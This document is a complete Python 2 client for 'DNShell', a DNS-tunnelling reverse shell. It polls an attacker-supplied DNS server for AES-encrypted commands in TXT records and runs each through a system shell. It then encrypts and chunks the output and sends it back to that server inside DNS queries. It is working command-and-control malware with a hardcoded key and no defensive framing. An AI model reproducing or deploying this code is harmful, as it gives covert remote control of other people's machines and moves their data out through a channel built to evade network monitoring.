#!/usr/bin/env python
# DNShell Client v1.7

from Crypto.Cipher import AES
import subprocess, os
import dns.resolver
import textwrap, base64
import re, logging
from optparse import OptionParser

TLD = 'com'
NXT_CMD = 'nxt'
ANSWER = ';ANSWER'
TYPE = 'TXT'
# REPLACE THIS WITH YOUR OWN KEY AND IV #
secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"
iv = "1cYGbLz8qN4umT4c"

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding-
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# create a CBC cipher object using a random secret and iv
cipher = AES.new(secret, AES.MODE_CBC, iv)

def encrypt(string):
  encoded = EncodeAES(cipher, string)
  return encoded

def decrypt(string):
  decoded = DecodeAES(cipher, string)
  return decoded

# Default connection reset string, b64 encoded:
nextCommand = base64.b64encode(NXT_CMD)

def formURL(cmd):
  return '{}.{}'.format(cmd, TLD)

def startConnection(host):
  ## Query fake dns server for commands to run:
  url = formURL(nextCommand)
  request = dns.message.make_query(url, dns.rdatatype.TXT)
  answers = dns.query.udp(request, host)
  a = answers.to_text()
  return a

def parseCmd(a):
  cmd = ''
  answer = 0
  for line in a.split("\n"):
    if answer == 1:
      cmd = textwrap.dedent(line.split(TYPE)[-1]).strip('"')
      answer = 0
    if ANSWER in line: answer = 1
  return cmd

def encodeB64Equals(output):
  # Remove "=", add "-" to denote we need "="
  if output[-1] == "=": 
    if output[-2] == "=":
      output = output[0]+"-"+output[1]+"-"+output[2:-2]
    else:
      output = output[0]+"-"+output[1:-1]
  return output

def processOutput(stdoutput):
  # Encrypt output
  eStdoutput = encrypt(stdoutput)
  # Encode output data, ready for loop
  output = base64.b64encode(eStdoutput)
  output = encodeB64Equals(output)
  return output

def runCmd(cmd):
  # Parse command from response
  eNxtCmd = base64.b64decode(cmd)
  # Decrypt response
  nxtCmd = decrypt(eNxtCmd)
 
  # Check for server quit command
  if nxtCmd == "quit": exit(0)

  # Execute server command
  proc = subprocess.Popen(nxtCmd, shell=True, stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  stdoutput = proc.stdout.read() + proc.stderr.read()

  # Handle Directory Changes:
  if re.match('^cd .*', nxtCmd):
    try:
      directory = nxtCmd.split('cd ')[-1]
      os.chdir(directory)
      stdoutput = '{}'.format(os.getcwd())
    except:
      stdoutput = 'Couldn\'t change directory to: {}'.format(directory)
 
  output = processOutput(stdoutput)

  return output

def dnsMakeQuery(url, host):
  feedback_request = dns.message.make_query(url, dns.rdatatype.A)
  dns.query.udp(feedback_request, host)

def sendOutputToServer(output, host):
  send =''
  output_end = len(output)
  for chunk in output:
    send += chunk
    output_end -= 1
    # Send 58 charcter chunks:
    if len(send) == 58:
      url = formURL(send)
      dnsMakeQuery(url, host)
      send =''
    # Send out final chunk:
    if output_end == 0:
      url = formURL(send)
      dnsMakeQuery(url, host)

def start(host):
  while 1:
    a = startConnection(host)
    cmd = parseCmd(a)
    stdoutput = runCmd(cmd)
    sendOutputToServer(stdoutput, host)

def main():
  # Setup the command line arguments.
  optp = OptionParser()

  # Output verbosity options
  optp.add_option('-q', '--quiet', help='set logging to ERROR',
                  action='store_const', dest='loglevel',
                  const=logging.ERROR, default=logging.INFO)
  optp.add_option('-d', '--debug', help='set logging to DEBUG',
                  action='store_const', dest='loglevel',
                  const=logging.DEBUG, default=logging.INFO)
  optp.add_option('-v', '--verbose', help='set logging to COMM',
                  action='store_const', dest='loglevel',
                  const=5, default=logging.INFO)

  # Option to query a specific server
  optp.add_option("-s", "--server", dest="host",
                  help="DNS server to query")

  opts, args = optp.parse_args()

  # Setup logging.
  logging.basicConfig(level=opts.loglevel,
                      format='%(levelname)-8s %(message)s')

  if opts.host is None:
    opts.host = raw_input("DNS server to query: ")

  start(opts.host)


if __name__ == '__main__':
  main()
